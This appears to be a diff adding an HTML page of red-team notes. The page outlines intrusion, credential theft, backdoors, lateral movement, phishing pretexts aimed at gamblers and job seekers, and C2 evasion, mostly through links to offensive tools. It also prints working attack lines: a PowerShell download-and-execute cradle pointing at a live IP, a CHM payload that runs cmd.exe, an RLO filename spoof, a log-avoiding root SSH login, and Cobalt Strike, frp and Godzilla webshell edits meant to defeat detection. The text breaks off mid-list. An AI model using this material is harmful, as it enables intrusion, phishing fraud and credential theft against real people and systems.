+<li><a href="https://github.com/Offensive-Panda/ShadowDumper">https://github.com/Offensive-Panda/ShadowDumper</a></li>
+<li>Export hashes via multiple methods</li>
+</ul>
+<h3 id="persistence-methods">Persistence methods</h3>
+<h4 id="windows-backdoors">Windows backdoors</h4>
+<ul>
+<li>Auto-start backdoor</li>
+<li><a href="https://github.com/mdsecactivebreach/WMIPersistence">https://github.com/mdsecactivebreach/WMIPersistence</a></li>
+<li><a href="https://github.com/netero1010/GhostTask">https://github.com/netero1010/GhostTask</a></li>
+</ul>
+<h4 id="linux-backdoors">Linux backdoors</h4>
+<ul>
+<li>PAM backdoor</li>
+<li>tsh backdoor</li>
+</ul>
+<h4 id="modify-source-code-to-insert-a-backdoor">Modify source code to insert a backdoor</h4>
+<h3 id="internal-network-core-device-attackdefense-and-reconnaissance-approaches">Internal network core device attack/defense and reconnaissance approaches</h3>
+<h4 id="nas">nas</h4>
+<h4 id="mail-servers">Mail servers</h4>
+<h4 id="bastion-hosts-jump-servers">Bastion hosts (jump servers)</h4>
+<h4 id="vcenter">vcenter</h4>
+<h4 id="vdi-cloud-desktops">VDI cloud desktops</h4>
+<h4 id="vpn">vpn</h4>
+<h3 id="non-domain-internal-network-penetration-testing">Non-domain internal network penetration testing</h3>
+<h4 id="how-to-get-in">How to get in</h4>
+<ul>
+<li>(Web initial access) Linux getshell</li>
+<li>Re-crawl the web source code for sensitive information<ul>
+<li>secretkey|hardcoded</li>
+<li>url</li>
+<li>Pull it back and audit the code</li>
+<li>Find more vulnerabilities to maintain access</li>
+<li>Find web-accessible directories</li>
+<li>Plant a shell</li>
+</ul>
+</li>
+<li>Find key local information<ul>
+<li>host</li>
+<li>history</li>
+<li>.....</li>
+<li>.viminfo</li>
+<li>SSH private keys</li>
+</ul>
+</li>
+<li>Capture SSH passwords via PAM<ul>
+<li>Build the environment locally and compile the .so file yourself</li>
+</ul>
+</li>
+<li>Scan memory<ul>
+<li><a href="https://github.com/liamg/dismember">https://github.com/liamg/dismember</a></li>
+</ul>
+</li>
+<li><a href="https://platypus-reverse-shell.vercel.app/">https://platypus-reverse-shell.vercel.app</a></li>
+<li>Find directories<ul>
+<li>
+<blockquote>
+<p>find / -writable -type d 2&gt;/dev/null      # writable directory
+find / -perm -222 -type d 2&gt;/dev/null     # writable directory 
+find / -perm -o w -type d 2&gt;/dev/null     # writable directory
+find / -perm -o x -type d 2&gt;/dev/null     # executable directory
+find / ( -perm -o w -perm -o x ) -type d 2&gt;/dev/null   # writable and executable directory</p>
+</blockquote>
+</li>
+<li>attrib +s +h +r 1.txt  modify file timestamp</li>
+</ul>
+</li>
+<li>Check iptables</li>
+<li>ssh -T root@192.168.1.1 /usr/bin/bash -i<ul>
+<li>Ghost login</li>
+<li>No pseudo-terminal allocated, no logs, but a connection exists</li>
+</ul>
+</li>
+<li>grep -rn "jdbc:oracle" /opt/SuperMap/TongWeb7.0.4.1/domains/tw_80/<ul>
+<li>Search files containing a specific string</li>
+</ul>
+</li>
+<li>vpn</li>
+<li>Get a shell via a vulnerability</li>
+<li>Vulnerability leaks usernames and passwords<ul>
+<li>fortinet</li>
+</ul>
+</li>
+<li>Vulnerability leaks cookies<ul>
+<li>Some cloud desktops</li>
+<li>Extortion</li>
+</ul>
+</li>
+<li>Traffic is clearly visible, quickly find a jump host</li>
+<li>sso</li>
+<li>DNS hijacking to bypass two-factor verification</li>
+<li>Watch for login alerts on the target's devices</li>
+<li>OAuth vulnerabilities</li>
+<li>A standalone Windows host</li>
+<li>Registry information gathering<ul>
+<li><a href="https://github.com/SpecterOps/Nemesis">https://github.com/SpecterOps/Nemesis</a></li>
+</ul>
+</li>
+<li>Find sensitive files<ul>
+<li><a href="https://github.com/c1y2m3/FileSearch">https://github.com/c1y2m3/FileSearch</a></li>
+<li><a href="https://github.com/Naturehi666/searchall">https://github.com/Naturehi666/searchall</a></li>
+<li><a href="https://github.com/mandiant/msi-search">https://github.com/mandiant/msi-search</a></li>
+<li><a href="https://github.com/AabyssZG/FindEverything">https://github.com/AabyssZG/FindEverything</a></li>
+<li>Search for files with a specific name under a designated disk</li>
+<li>dir D:\ /S /B | find "orange1.jsp"</li>
+<li>/S          Display files in the specified directory and all subdirectories.</li>
+<li>/B          Use a bare format (no header information or summary).</li>
+<li>Search the entire disk for files with a specific name</li>
+<li>cmd /v:off /Q /c "for /f %i in (^'wmic logicaldisk get caption ^| findstr ":"^') do dir %i\ /b /s 2&gt;nul | findstr "ToDesk_Lite.exe""</li>
+</ul>
+</li>
+<li>RDP hijacking<ul>
+<li><a href="https://github.com/S12cybersecurity/RDPCredentialStealer">https://github.com/S12cybersecurity/RDPCredentialStealer</a></li>
+<li><a href="https://github.com/GoSecure/pyrdp">https://github.com/GoSecure/pyrdp</a></li>
+<li><a href="https://github.com/0x09AL/RdpThief">https://github.com/0x09AL/RdpThief</a></li>
+</ul>
+</li>
+<li>View command history<ul>
+<li>Under cmd: doskey /history</li>
+<li>Under PowerShell: Get-History</li>
+</ul>
+</li>
+<li>RAT/C2 development<ul>
+<li>Execute commands</li>
+<li>List directories</li>
+<li>Cloud OSS + git</li>
+</ul>
+</li>
+<li>onedrive\ossutil\github lfs</li>
+<li><a href="https://gofile.io/">https://gofile.io/</a>, <a href="https://send.cm/">https://send.cm/</a>, <a href="https://krakenfiles.com/">https://krakenfiles.com/</a>, <a href="https://download.ru/">https://download.ru/</a></li>
+</ul>
+<h4 id="lateral-movement">Lateral movement</h4>
+<ul>
+<li>Web ports</li>
+<li>Common web ports</li>
+<li>Web ports discovered from server reconnaissance<ul>
+<li>log</li>
+<li>Connect</li>
+</ul>
+</li>
+<li>Other port vulnerabilities</li>
+<li><a href="https://github.com/AabyssZG/Docker-TCP-Scan">https://github.com/AabyssZG/Docker-TCP-Scan</a></li>
+<li>Dictionary password spraying<ul>
+<li>Connection tools|elastic....</li>
+<li><a href="https://github.com/team-ide/teamide">https://github.com/team-ide/teamide</a></li>
+</ul>
+</li>
+<li>Database getshell</li>
+<li>...</li>
+<li>Kubernetes:8443 port</li>
+<li>Critical network infrastructure|gateway|dns|device weak credentials</li>
+<li>DNS hijacking<ul>
+<li>Client-side red team</li>
+<li>International hotel</li>
+<li>Ettercap|http</li>
+</ul>
+</li>
+<li>switch<ul>
+<li>Weak credentials</li>
+<li>cirtx</li>
+<li><a href="https://github.com/Blootus/CVE-2024-20399-Cisco-RCE">https://github.com/Blootus/CVE-2024-20399-Cisco-RCE</a></li>
+</ul>
+</li>
+<li>Brute-force domain names</li>
+</ul>
+<h4 id="locating-the-domain">Locating the domain</h4>
+<ul>
+<li><a href="https://github.com/sosdave/KeyTabExtract">https://github.com/sosdave/KeyTabExtract</a></li>
+<li>resolve.conf</li>
+<li>dns</li>
+<li>/etc/krb5.conf</li>
+<li>smb.conf</li>
+<li>CIFS mount</li>
+<li>Locate NAS</li>
+<li>Locate AD-authenticated web services</li>
+<li>Source code + server config files</li>
+<li>Locate VDI</li>
+<li>Common recon commands; avoid anything involving requests or empty servers</li>
+<li>Locate WSUS</li>
+<li>Locate SCCM</li>
+<li>Locate EDR-managed endpoints</li>
+<li>Check network connections</li>
+<li>139<ul>
+<li>Dual NICs</li>
+</ul>
+</li>
+<li>445</li>
+<li>389</li>
+<li>636</li>
+<li>gitlab, etc.</li>
+</ul>
+<h4 id="tvsunlogin">TV|Sunlogin|</h4>
+<h3 id="server-and-personal-pc-recon-tools-and-methods">Server and personal PC recon tools and methods</h3>
+<h4 id="bypass-edr-to-obtain-hashes_1">Bypass EDR to obtain hashes</h4>
+<h4 id="host-management-tool-recon">Host management tool recon</h4>
+<ul>
+<li>Shell management tools</li>
+<li>finalshell<ul>
+<li><a href="https://github.com/MaskCyberSecurityTeam/FinalShellGetPass">https://github.com/MaskCyberSecurityTeam/FinalShellGetPass</a></li>
+</ul>
+</li>
+<li>xshell</li>
+<li>Email</li>
+<li>Foxmail</li>
+<li>Browser</li>
+<li>chrome<ul>
+<li><a href="https://github.com/Meckazin/ChromeKatz">https://github.com/Meckazin/ChromeKatz</a></li>
+<li>unlock</li>
+<li>Shadow file</li>
+<li><a href="https://github.com/StarfireLab/BrowserPivot">https://github.com/StarfireLab/BrowserPivot</a></li>
+<li>DPAPI keys</li>
+<li><a href="https://github.com/magisterquis/chromecookiestealer">https://github.com/magisterquis/chromecookiestealer</a></li>
+</ul>
+</li>
+<li><a href="https://github.com/AlessandroZ/LaZagne">https://github.com/AlessandroZ/LaZagne</a></li>
+<li>telegram</li>
+<li><a href="https://github.com/atilaromero/telegram-desktop-decrypt">https://github.com/atilaromero/telegram-desktop-decrypt</a></li>
+<li>VPN connection info decryption</li>
+<li><a href="https://rotarydrone.medium.com/decrypting-and-replaying-vpn-cookies-4a1d8fc7773e">https://rotarydrone.medium.com/decrypting-and-replaying-vpn-cookies-4a1d8fc7773e</a></li>
+<li>ToDesk, Sunlogin, VNC</li>
+<li><a href="https://github.com/flydyyg/readTdose-xiangrikui">https://github.com/flydyyg/readTdose-xiangrikui</a></li>
+<li><a href="https://github.com/frizb/PasswordDecrypts">https://github.com/frizb/PasswordDecrypts</a></li>
+<li>Password managers</li>
+<li>KeePass<ul>
+<li><a href="https://github.com/vdohney/keepass-password-dumper">https://github.com/vdohney/keepass-password-dumper</a></li>
+</ul>
+</li>
+<li><a href="https://github.com/lemonlove7/passwd_decrypt_Tools">https://github.com/lemonlove7/passwd_decrypt_Tools</a></li>
+<li><a href="https://github.com/qwqdanchun/Pillager">https://github.com/qwqdanchun/Pillager</a></li>
+<li><a href="https://github.com/V1V1/SharpScribbles">https://github.com/V1V1/SharpScribbles</a></li>
+<li><a href="https://github.com/Pizz33/GoThief">https://github.com/Pizz33/GoThief</a></li>
+<li><a href="https://github.com/can-kat/cstealer">https://github.com/can-kat/cstealer</a></li>
+</ul>
+<h4 id="pyinstallerexe-f-bbscanpy-clean-add-data-rulesrules">pyinstaller.exe -F BBScan.py --clean --add-data rules;rules</h4>
+<ul>
+<li>Tools for hosts without outbound access need to be packaged as exe</li>
+</ul>
+<h3 id="first-step-into-the-internal-network">First step into the internal network</h3>
+<h4 id="rapid-local-recon">Rapid local recon</h4>
+<h4 id="find-web-services-on-the-internal-network-security-devices">Find web services on the internal network (security devices)</h4>
+<h4 id="c2-benign-traffic">C2 benign traffic</h4>
+<h2 id="phishing"><strong>Phishing</strong></h2>
+<h3 id="pretext-scripts">Pretext scripts</h3>
+<h4 id="gamblers">Gamblers</h4>
+<ul>
+<li>System malfunction</li>
+<li>Cannot open account</li>
+<li>Cannot deposit</li>
+<li>Cannot withdraw</li>
+<li>Enable proxy</li>
+<li>Cannot get rebate</li>
+<li>Overseas gamblers</li>
+<li>Cannot add bank card</li>
+</ul>
+<h4 id="job-application">Job application</h4>
+<ul>
+<li>Send resume</li>
+<li>Book a meeting room</li>
+<li>Interview software upgrade</li>
+</ul>
+<h4 id="cooperation">Cooperation</h4>
+<ul>
+<li>Guild leader</li>
+<li>First-hand gambler data</li>
+<li>Fourth-party payment</li>
+<li>Low success rate|offline</li>
+<li>White-label iGaming platform service</li>
+<li>Provide cases</li>
+<li>Provide source code</li>
+<li>Provide updates</li>
+</ul>
+<h4 id="httpgongwenguancom"><a href="http://gongwenguan.com/">http://gongwenguan.com/</a></h4>
+<h3 id="building-a-real-world-watering-hole">Building a real-world watering hole</h3>
+<h4 id="domain-purchase-choosing-phishing-domains">Domain purchase / choosing phishing domains</h4>
+<ul>
+<li><a href="http://www.expireddomains.com/">www.Expireddomains.com</a></li>
+<li>typo</li>
+<li>unicode<ul>
+<li><a href="https://zh.wikipedia.org/wiki/Unicode%E5%AD%97%E7%AC%A6%E5%88%97%E8%A1%A8">https://zh.wikipedia.org/wiki/Unicode%E5%AD%97%E7%AC%A6%E5%88%97%E8%A1%A8</a></li>
+</ul>
+</li>
+<li><a href="https://github.com/evilsocket/ditto">https://github.com/evilsocket/ditto</a></li>
+<li>spf</li>
+<li><a href="https://github.com/SummerSec/spf">https://github.com/SummerSec/spf</a></li>
+<li><a href="https://github.com/chenjj/espoofer.git">https://github.com/chenjj/espoofer.git</a></li>
+<li><a href="https://github.com/jetmore/swaks">https://github.com/jetmore/swaks</a></li>
+<li><a href="https://emkei.cz/">https://emkei.cz/</a></li>
+<li>Sub-org|self-hosted mail server, domain</li>
+<li>SendGrid</li>
+<li>mailgun</li>
+<li><a href="https://github.com/r00tSe7en/Mail-Probe">https://github.com/r00tSe7en/Mail-Probe</a></li>
+</ul>
+<h4 id="building-the-watering-hole-page">Building the watering-hole page</h4>
+<ul>
+<li>Chrome phishing</li>
+<li><a href="https://www.google.com/intl/zh-CN/chrome/">https://www.google.com/intl/zh-CN/chrome/</a></li>
+<li>Flash phishing</li>
+<li><a href="https://github.com/r00tSe7en/Flash-Pop">https://github.com/r00tSe7en/Flash-Pop</a></li>
+<li><a href="https://github.com/crow821/FakeFlash">https://github.com/crow821/FakeFlash</a></li>
+<li>Customer service system upgrade notice</li>
+<li>Requires an XSS to exist<ul>
+<li>Self-hosted customer service platform</li>
+<li>File content parsing<ul>
+<li>markdown</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>Phishing templates</li>
+<li><a href="https://github.com/Threezh1/SiteCopy.git">https://github.com/Threezh1/SiteCopy.git</a></li>
+<li><a href="https://smalltool.github.io/">https://smalltool.github.io/</a></li>
+<li><a href="https://github.com/htr-tech/zphisher">https://github.com/htr-tech/zphisher</a></li>
+<li><a href="https://github.com/JoelGMSec/EvilnoVNC">https://github.com/JoelGMSec/EvilnoVNC</a></li>
+<li>evilginx</li>
+<li>fake login</li>
+<li><a href="https://github.com/bitsadmin/fakelogonscreen">https://github.com/bitsadmin/fakelogonscreen</a></li>
+<li><a href="https://github.com/Pickfordmatt/SharpLocker">https://github.com/Pickfordmatt/SharpLocker</a></li>
+<li><a href="https://github.com/Dviros/CredsLeaker">https://github.com/Dviros/CredsLeaker</a></li>
+<li><a href="https://github.com/An0nUD4Y/Evilginx2-Phishlets">https://github.com/An0nUD4Y/Evilginx2-Phishlets</a></li>
+<li><a href="https://github.com/klezVirus/evilginx-collection">https://github.com/klezVirus/evilginx-collection</a></li>
+<li><a href="https://github.com/eversinc33/Web-Windows-Login-Phishing">https://github.com/eversinc33/Web-Windows-Login-Phishing</a></li>
+</ul>
+<h4 id="backend-environment-setup-and-anti-sandbox">Backend environment setup and anti-sandbox</h4>
+<ul>
+<li>otp</li>
+<li><a href="https://github.com/asnzodiac/asnphishing">https://github.com/asnzodiac/asnphishing</a></li>
+<li>Set up your own XSS platform, or your cookies belong to someone else</li>
+<li><a href="https://goblin.xiecat.fun/guide/#flash-demo">https://goblin.xiecat.fun/guide/#flash-demo</a></li>
+<li>flash, modify it yourself</li>
+<li><a href="https://github.com/highmeh/lure">https://github.com/highmeh/lure</a></li>
+<li>Collect email|use with emailall</li>
+<li><a href="https://github.com/doyensec/Session-Hijacking-Visual-Exploitation">https://github.com/doyensec/Session-Hijacking-Visual-Exploitation</a></li>
+<li><a href="https://github.com/fin3ss3g0d/evilgophish">https://github.com/fin3ss3g0d/evilgophish</a></li>
+</ul>
+<h3 id="payload-crafting-methods">Payload crafting methods</h3>
+<h4 id="winrar">winrar</h4>
+<ul>
+<li>Self-extracting</li>
+<li><a href="https://github.com/b1tg/CVE-2023-38831-winrar-exploit">https://github.com/b1tg/CVE-2023-38831-winrar-exploit</a></li>
+</ul>
+<h4 id="rlo-filename-reversal">RLO filename reversal</h4>
+<ul>
+<li>File marking</li>
+<li>exe-&gt;scr|pif</li>
+</ul>
+<h4 id="link">link</h4>
+<ul>
+<li><a href="https://github.com/dievus/lnkbomb">https://github.com/dievus/lnkbomb</a></li>
+<li><a href="https://github.com/Yihsiwei/Lnk-Trojan">https://github.com/Yihsiwei/Lnk-Trojan</a></li>
+<li><a href="https://github.com/nickvourd/Rocabella">https://github.com/nickvourd/Rocabella</a></li>
+<li><a href="https://github.com/Pizz33/FTPlnk_phishing">https://github.com/Pizz33/FTPlnk_phishing</a></li>
+</ul>
+<h4 id="import-os-osrename1exe-1u202egnpexe">import os  os.rename('1.exe', '1\u202egnp.exe')</h4>
+<h4 id="httpsgithubcominspiringzgofilebinder"><a href="https://github.com/inspiringz/GoFileBinder">https://github.com/inspiringz/GoFileBinder</a></h4>
+<h4 id="chm">CHM</h4>
+<ul>
+<li>easychm</li>
+<li>&lt;!DOCTYPE html&gt;<html><head><title>Mousejack replay</title><head></head><body>command exec <OBJECT id=x classid="clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11" width=1 height=1><PARAM name="Command" value="ShortCut"> <PARAM name="Button" value="Bitmap::shortcut"> <PARAM name="Item1" value=',cmd.exe,/c calc.exe'> <PARAM name="Item2" value="273,1,1"></OBJECT><SCRIPT>x.Click();</SCRIPT></body></html></li>
+</ul>
+<h4 id="ico-replacement">ICO replacement</h4>
+<ul>
+<li><a href="https://jarlpenguin.github.io/BeCyIconGrabberPortable/">https://jarlpenguin.github.io/BeCyIconGrabberPortable/</a></li>
+<li><a href="https://www.angusj.com/resourcehacker/">https://www.angusj.com/resourcehacker/</a></li>
+<li><a href="https://www.nirsoft.net/utils/iconsext.html">https://www.nirsoft.net/utils/iconsext.html</a></li>
+<li><a href="https://www.lanzoux.com/iBvsMhajljg">https://www.lanzoux.com/iBvsMhajljg</a></li>
+</ul>
+<h4 id="httpsgithubcomtokyoneonb2e"><a href="https://github.com/tokyoneon/B2E">https://github.com/tokyoneon/B2E</a></h4>
+<ul>
+<li>notepad chcp 1200 &amp; powershell  -c "IEX(New-Object Net.WebClient)."DownloadString"('ht‘+’tp://106.53.97.7:82/a')"</li>
+</ul>
+<h4 id="overlong-filenames">Overlong filenames</h4>
+<h4 id="httpscliimtools"><a href="https://cli.im/tools">https://cli.im/tools</a></h4>
+<h4 id="httpsgithubcomdr0opcrossnet-beta"><a href="https://github.com/dr0op/CrossNet-Beta">https://github.com/dr0op/CrossNet-Beta</a></h4>
+<ul>
+<li>Just look at it to learn the approach</li>
+</ul>
+<h4 id="httpsgithubcomdeepzecbad-pdf"><a href="https://github.com/deepzec/Bad-Pdf">https://github.com/deepzec/Bad-Pdf</a></h4>
+<h4 id="httpsgithubcomthecyb3ralphabobthesmuggler"><a href="https://github.com/TheCyb3rAlpha/BobTheSmuggler">https://github.com/TheCyb3rAlpha/BobTheSmuggler</a></h4>
+<h2 id="ratc2-tool-development"><strong>RAT/C2 tool development</strong></h2>
+<h3 id="cobalt-strike-in-practice-signature-removal-and-evasion">Cobalt Strike in practice: signature removal and evasion</h3>
+<h4 id="plugin-development">Plugin development</h4>
+<ul>
+<li><a href="https://github.com/lintstar/LSTAR">https://github.com/lintstar/LSTAR</a></li>
+<li><a href="https://github.com/REDMED-X/OperatorsKit">https://github.com/REDMED-X/OperatorsKit</a></li>
+<li><a href="https://github.com/lintstar/CS-AutoPostChain">https://github.com/lintstar/CS-AutoPostChain</a></li>
+<li><a href="https://github.com/qigpig/Ghosting-BOF">https://github.com/qigpig/Ghosting-BOF</a></li>
+<li><a href="https://github.com/CodeXTF2/WindowSpy">https://github.com/CodeXTF2/WindowSpy</a></li>
+<li><a href="https://github.com/trustedsec/CS-Remote-OPs-BOF/tree/main?tab=readme-ov-file">https://github.com/trustedsec/CS-Remote-OPs-BOF/tree/main?tab=readme-ov-file</a></li>
+<li><a href="https://github.com/mertdas/PrivKit">https://github.com/mertdas/PrivKit</a></li>
+<li><a href="https://github.com/rasta-mouse/PPEnum">https://github.com/rasta-mouse/PPEnum</a></li>
+<li><a href="https://github.com/m3rcer/Chisel-Strike">https://github.com/m3rcer/Chisel-Strike</a></li>
+<li><a href="https://github.com/tijme/cmstplua-uac-bypass">https://github.com/tijme/cmstplua-uac-bypass</a></li>
+<li><a href="https://github.com/yutianqaq/CSx4Ldr">https://github.com/yutianqaq/CSx4Ldr</a></li>
+<li>cna or bof xxx</li>
+<li>beacon = client.beacons.first ;beacon.execute_bof('example')<ul>
+<li>beacon.inline_execute('<Beacon ID>', '<CBOF C Code Snippet>')</li>
+</ul>
+</li>
+<li><a href="https://github.com/dtmsecurity/bof_helper">https://github.com/dtmsecurity/bof_helper</a></li>
+<li><a href="https://github.com/securifybv/Visual-Studio-BOF-template">https://github.com/securifybv/Visual-Studio-BOF-template</a></li>
+<li><a href="https://github.com/kyleavery/AceLdr">https://github.com/kyleavery/AceLdr</a></li>
+<li><a href="https://github.com/Cobalt-Strike/bof-vs">https://github.com/Cobalt-Strike/bof-vs</a></li>
+<li><a href="https://github.com/fortra/No-Consolation">https://github.com/fortra/No-Consolation</a></li>
+<li><a href="https://github.com/ScriptIdiot/BOF-patchit">https://github.com/ScriptIdiot/BOF-patchit</a></li>
+<li><a href="https://github.com/qwqdanchun/ScreenShot-BOF">https://github.com/qwqdanchun/ScreenShot-BOF</a></li>
+<li><a href="https://github.com/rasta-mouse/SCMUACBypass">https://github.com/rasta-mouse/SCMUACBypass</a></li>
+<li><a href="https://github.com/9bie/Slacker">https://github.com/9bie/Slacker</a></li>
+<li><a href="https://github.com/ewby/Mockingjay_BOF">https://github.com/ewby/Mockingjay_BOF</a></li>
+<li><a href="https://github.com/baiyies/ScreenshotBOFPlus">https://github.com/baiyies/ScreenshotBOFPlus</a></li>
+<li><a href="https://github.com/Octoberfest7/DropSpawn_BOF">https://github.com/Octoberfest7/DropSpawn_BOF</a></li>
+<li><a href="https://github.com/WKL-Sec/HiddenDesktop">https://github.com/WKL-Sec/HiddenDesktop</a></li>
+<li><a href="https://github.com/boku7/whereami">https://github.com/boku7/whereami</a></li>
+<li><a href="https://github.com/Mr-Un1k0d3r/Cookie-and-Handle-Stealer">https://github.com/Mr-Un1k0d3r/Cookie-and-Handle-Stealer</a></li>
+</ul>
+<h4 id="server-setup">Server setup</h4>
+<ul>
+<li>Disable ping</li>
+<li>Add a line in /etc/sysctl.conf</li>
+<li>net.ipv4.icmp_echo_ignore_all=1</li>
+<li>cdn</li>
+<li>Free Cloudflare account</li>
+</ul>
+<h4 id="cs-modifications">CS modifications</h4>
+<ul>
+<li><a href="https://github.com/CodeXTF2/Burp2Malleable">https://github.com/CodeXTF2/Burp2Malleable</a></li>
+<li><a href="https://github.com/RedSiege/C2concealer">https://github.com/RedSiege/C2concealer</a></li>
+<li><a href="https://github.com/RedSiege/GraphStrike">https://github.com/RedSiege/GraphStrike</a></li>
+<li><a href="https://github.com/D00Movenok/goMalleable">https://github.com/D00Movenok/goMalleable</a></li>
+<li><a href="https://github.com/byt3bl33d3r/pyMalleableC2">https://github.com/byt3bl33d3r/pyMalleableC2</a></li>
+<li><a href="https://github.com/Peithon/JustC2file">https://github.com/Peithon/JustC2file</a></li>
+</ul>
+<h4 id="beacon">beacon</h4>
+<ul>
+<li><a href="https://github.com/Z3ratu1/geacon_plus">https://github.com/Z3ratu1/geacon_plus</a></li>
+<li><a href="https://github.com/b1tg/cobaltstrike-beacon-rust">https://github.com/b1tg/cobaltstrike-beacon-rust</a></li>
+<li><a href="https://github.com/tijme/amd-ryzen-master-driver-v17-exploit">https://github.com/tijme/amd-ryzen-master-driver-v17-exploit</a></li>
+<li><a href="https://github.com/NoOne-hub/Beacon.dll">https://github.com/NoOne-hub/Beacon.dll</a></li>
+<li>Simple reverse engineering</li>
+<li><a href="https://github.com/kyxiaxiang/Beacon_Source">https://github.com/kyxiaxiang/Beacon_Source</a></li>
+<li>Modify signatures</li>
+<li>private static byte[] OriginKey = {-1, 12, -6, 65, 7, -47, 91, 48, 17, 61, 29, 43, -99, -23, 21, 109};private static byte[] CustomizeKey = {-1, 12, -6, 65, 7, -47, 91, 48, 17, 61, 29, 43, -99, -23, 21, 109};<ul>
+<li>Modify key</li>
+</ul>
+</li>
+<li>Modify profile<ul>
+<li>transform-x64 {    strrep "beacon.x64.dll" "";}</li>
+<li>Modify keywords</li>
+<li>set magic_mz_x86 "1234"; set magic_mz_x64 "5678";</li>
+<li>Modify MZ header</li>
+<li>set magic_pe "BB";</li>
+<li>Modify PE header</li>
+<li>set cleanup "true";</li>
+<li>Clean the original Beacon DLL</li>
+<li>set obfuscate "true";</li>
+<li>Removes the DLL header</li>
+<li>set userwx "false";</li>
+<li>No need to make it writable</li>
+<li><a href="https://github.com/maxamin/MalwarePack/tree/355cd11bd6dd8d465d6c82187fc3bd52836c52e7/arsenal-kit">https://github.com/maxamin/MalwarePack/tree/355cd11bd6dd8d465d6c82187fc3bd52836c52e7/arsenal-kit</a></li>
+<li>void my_mask_section(SLEEPMASKP * parms, DWORD a, DWORD b) {   char key[] = "cf81d743beef8422";   size_t key_lenght = sizeof(key) - 1;   while (a &lt; b) {      *(parms-&gt;beacon_ptr + a) ^= key[a % key_lenght];      a++;   }}<ul>
+<li>Modify sleepmask signatures</li>
+</ul>
+</li>
+<li>Modify MSSE pipe signature</li>
+</ul>
+</li>
+<li>beaconeye<ul>
+<li>6A 00</li>
+</ul>
+</li>
+</ul>
+<h3 id="traffic-forwarding-tool-re-development">Traffic forwarding tool re-development</h3>
+<h4 id="methods">Methods</h4>
+<ul>
+<li>Modify the tool's User-Agent header</li>
+<li><a href="https://hasdata.com/blog/user-agents-for-web-scraping">https://hasdata.com/blog/user-agents-for-web-scraping</a></li>
+<li>User-Agent Switcher and Manager (Chrome extension)</li>
+<li>Self-deleting config file</li>
+<li>Hard-code the config directly into main<ul>
+<li>func getFileContent(ip string, port string) { key := "testkey"    ip = str2xor(ip, key)   port = str2xor(port, key)   var configContent string = <code>[common]        server_addr =</code> + ip + <code>server_port =</code> + port + <code>tls_enable = true   [plugin_socks]  type = tcp  remote_port = 7788  plugin = socks5 #plugin_user = ""   #plugin_passwd = ""</code>   fileContent = configContent}</li>
+</ul>
+</li>
+<li>if cfg.DELEnable == true { os.Remove(cfgFile) }</li>
+<li>Load config file remotely</li>
+<li>TLS fingerprint</li>
+<li><a href="https://github.com/sleeyax/burp-awesome-tls">https://github.com/sleeyax/burp-awesome-tls</a></li>
+<li>frp<ul>
+<li>pkg/util/net/tls.go</li>
+</ul>
+</li>
+<li>Domain fronting</li>
+<li>pkg/util/net/websocket.go</li>
+<li>Configure CDN origin as HTTP</li>
+<li>Uncommon outbound protocols</li>
+<li>quic<ul>
+<li>transport.protocol = "quic"quicBindPort = 7000</li>
+</ul>
+</li>
+<li>protobuf plugin</li>
+<li>Custom encryption/decryption</li>
+<li>chacha20</li>
+<li>XOR</li>
+<li>Use complex encryption for config files and auth; simple encryption for traffic packets, otherwise it gets slow</li>
+<li>Remove hardcoding</li>
+<li>salt, JSON data<ul>
+<li>May crash; watch the handling logic when debugging</li>
+<li>Pay special attention to the auth part fingerprint</li>
+<li>models/msg/msg.go</li>
+</ul>
+</li>
+<li>const ( FrpWebsocketPath = "/~!frp")</li>
+<li>Compile, obfuscate, pack</li>
+<li>upx</li>
+<li>garble</li>
+<li><a href="https://github.com/boy-hack/go-strip">https://github.com/boy-hack/go-strip</a></li>
+<li>DLL loading</li>
+<li>After covering EDR environment setup, move on to evasion</li>
+<li><a href="https://github.com/langsasec/Sign-Sacker">https://github.com/langsasec/Sign-Sacker</a></li>
+</ul>
+<h4 id="familiarizing-with-the-framework-structure">Familiarizing with the framework structure</h4>
+<ul>
+<li>Framework entry file</li>
+<li>Directory structure</li>
+<li>fscan<ul>
+<li>common</li>
+<li>Parsing of data, structs, and variable storage</li>
+<li>plugins</li>
+<li>Plugins<ul>
+<li>To understand the project structure and development, start by writing plugins</li>
+</ul>
+</li>
+<li>webscan</li>
+<li>Web scanning<ul>
+<li>Framework fingerprint identification</li>
+<li>Framework dispatch flow</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>Key functions</li>
+<li>Trace the framework logic forward<ul>
+<li>Modify the framework</li>
+</ul>
+</li>
+<li>Set breakpoints and trace backward how this gets called<ul>
+<li>Modify plugins</li>
+</ul>
+</li>
+<li>Dynamic debugging</li>
+<li>Add encryption/decryption and log output</li>
+</ul>
+<h4 id="detection">Detection</h4>
+<ul>
+<li><a href="https://github.com/cmluZw/Situational-Awareness">https://github.com/cmluZw/Situational-Awareness</a></li>
+<li><a href="https://github.com/Qianlitp/WatchAD">https://github.com/Qianlitp/WatchAD</a></li>
+<li><a href="https://github.com/Qihoo360/WatchAD2.0">https://github.com/Qihoo360/WatchAD2.0</a></li>
+<li><a href="https://abyssalfish-os.github.io/">https://abyssalfish-os.github.io/</a></li>
+<li>Cloud situational awareness</li>
+<li>SA</li>
+</ul>
+<h3 id="godzilla-signature-modification-used-for-disposable-entry-points-for-large-or-long-term-engagements-develop-a-dedicated-shell-management-tool">Godzilla signature modification (used for disposable entry points; for large or long-term engagements, develop a dedicated shell management tool)</h3>
+<h4 id="custom-traffic-encryption">Custom traffic encryption</h4>
+<ul>
+<li>Remove the md5 check</li>
+<li>core/ApplicationConfig.java</li>
+<li>Remove HTTP header signatures</li>
+<li>/shells/cryptions/*</li>
+<li>Change the key value to the last 16 characters; the location is in ShellEntity's getSecretKeyX method and the encryption class's generate method</li>
+</ul>
+<h4 id="required-tools">Required tools</h4>
+<ul>
+<li>JETBRAIN IDEA</li>
+<li>JETBRAIN RIDER</li>
+<li>ILspy</li>
+<li>sqlitestudio</li>
+<li>vistual studio2022</li>
+<li>The source code from decompiling the website is missing the files in the payload and plugin assets folders under shell; add them manually before repackaging and compiling</li>
+</ul>
+<h4 id="custom-command-execution">Custom command execution</h4>
+<ul>
+<li>Modify execCommand to copy cmd to a temp directory, execute it, then delete it</li>
+<li>Change the default variable names</li>
+<li>Recompile and replace the original payload.dll</li>
+<li>Modify ShellExecCommandPanel's default command code</li>
+<li>Remove the default command autofill</li>
+</ul>
+<h4 id="webshell-signature-removal">Webshell signature removal</h4>
+<ul>
